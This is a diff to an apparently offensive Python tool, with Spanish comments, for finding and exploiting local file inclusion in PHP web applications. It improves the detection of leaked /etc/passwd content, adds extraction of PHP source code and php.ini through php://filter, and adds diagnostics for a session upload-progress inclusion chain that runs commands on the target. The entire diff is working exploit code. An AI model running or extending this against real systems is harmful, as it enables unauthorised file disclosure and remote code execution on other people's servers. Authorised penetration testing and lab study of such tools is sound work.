@@ -244,18 +244,43 @@ def check_probe(kind, body):
             return True, "contiene " + PASSWD_MARK
         return False, ""
     if kind == "b64passwd":
+        # La respuesta puede ser solo el base64, o el base64 seguido de la
+        # pagina HTML (include dentro de una app real). Se prueban las dos.
         try:
             dec = base64.b64decode(text.strip(), validate=False).decode(errors="replace")
+            if PASSWD_MARK in dec:
+                return True, "base64 decodificado contiene " + PASSWD_MARK
         except Exception:
-            return False, ""
-        if PASSWD_MARK in dec:
-            return True, "base64 decodificado contiene " + PASSWD_MARK
+            pass
+        for chunk in re.findall(r"[A-Za-z0-9+/]{60,}={0,2}", text):
+            try:
+                dec = base64.b64decode(chunk, validate=False).decode(errors="replace")
+            except Exception:
+                continue
+            if PASSWD_MARK in dec:
+                return True, "bloque base64 dentro de la pagina contiene " + PASSWD_MARK
         return False, ""
     if kind == "data":
         if "LFI-DATA" in text:
             return True, "data:// ejecutado (allow_url_include=On)"
         return False, ""
     return False, ""
+
+
+def decode_php_b64(text):
+    """Devuelve el bloque base64 que decodifica a PHP, aunque haya pagina alrededor."""
+    for chunk in re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", text):
+        try:
+            dec = base64.b64decode(chunk, validate=False)
+        except Exception:
+            continue
+        if b"<?php" in dec:
+            return dec
+    try:
+        dec = base64.b64decode(text.strip(), validate=False)
+    except Exception:
+        return b""
+    return dec if b"<?php" in dec else b""
 
 
 def print_kv(label, value):
@@ -318,7 +343,6 @@ def scan(target, param=None, timeout=8, candidates=None):
                 vulnerable.append((c, value, label, detail))
 
     # Fuente del script (divulgacion de codigo)
-    m = re.search(r"in <b>([^<]+\.php)</b>", (body2 or b"").decode(errors="replace")) if suspects else None
     if suspects:
         c = suspects[0][0]
         for resource in ["index.php", "config.php"]:
@@ -326,11 +350,8 @@ def scan(target, param=None, timeout=8, candidates=None):
             st4, body4, _, _ = fetch(build_url(target, **{c: v}), timeout)
             if st4 is None:
                 continue
-            try:
-                dec = base64.b64decode(body4.decode(errors="replace").strip(), validate=False)
-            except Exception:
-                continue
-            if b"<?php" in dec:
+            dec = decode_php_b64(body4.decode(errors="replace"))
+            if dec:
                 print(f"  [+] Codigo fuente de {resource} obtenido ({len(dec)} bytes)")
                 print("  " + "-" * 60)
                 for line in dec.decode(errors="replace").splitlines()[:25]:
@@ -356,6 +377,41 @@ def scan(target, param=None, timeout=8, candidates=None):
         print("[-] No se detecto LFI con las sondas usadas (no significa que no exista).")
 
     return (vulnerable[0][0] if vulnerable else None)
+
+
+def read_via_filter(target, param, path, timeout=8):
+    """Lee un fichero remoto en base64 (evita que PHP lo interprete y falle)."""
+    url = build_url(
+        target, **{param: f"php://filter/convert.base64-encode/resource={path}"})
+    st, body, _, _ = fetch(url, timeout)
+    if st is None:
+        return None
+    text = body.decode(errors="replace")
+    for chunk in re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", text):
+        try:
+            dec = base64.b64decode(chunk, validate=False)
+        except Exception:
+            continue
+        if b"session.upload_progress" in dec:
+            return dec.decode(errors="replace")
+    return None
+
+
+def cleanup_hint(target, param, timeout=8):
+    """Si la cadena falla por cleanup=On, decirlo en vez de culpar a la ruta."""
+    for ini in ("/etc/php.ini", "/etc/php/8.2/apache2/php.ini",
+                "/etc/php/7.4/apache2/php.ini", "/usr/local/etc/php/php.ini"):
+        text = read_via_filter(target, param, ini, timeout)
+        if not text:
+            continue
+        m = re.search(r"^\s*;?\s*session\.upload_progress\.cleanup\s*=\s*(\w+)",
+                      text, re.M)
+        if m and m.group(1).lower() in ("on", "1"):
+            return (f"session.upload_progress.cleanup = On ({ini}): el progreso se "
+                    f"borra antes de poder incluirlo. Hace falta cleanup = Off.")
+        if m:
+            return None
+    return None
 
 
 def chain(target, param, session_name, session_paths, cmd, timeout=8):
@@ -403,7 +459,12 @@ def chain(target, param, session_name, session_paths, cmd, timeout=8):
             print(out if out else "(sin salida)")
             print("  " + "-" * 60)
             return sess_file
-    print("[-] No se ejecuto el payload. Prueba con --session-path con la ruta correcta.")
+    hint = cleanup_hint(target, param, timeout)
+    if hint:
+        print("[-] No se ejecuto el payload: la cadena esta cortada por configuracion.")
+        print("    " + hint)
+    else:
+        print("[-] No se ejecuto el payload. Prueba con --session-path con la ruta correcta.")
     return None
 
 
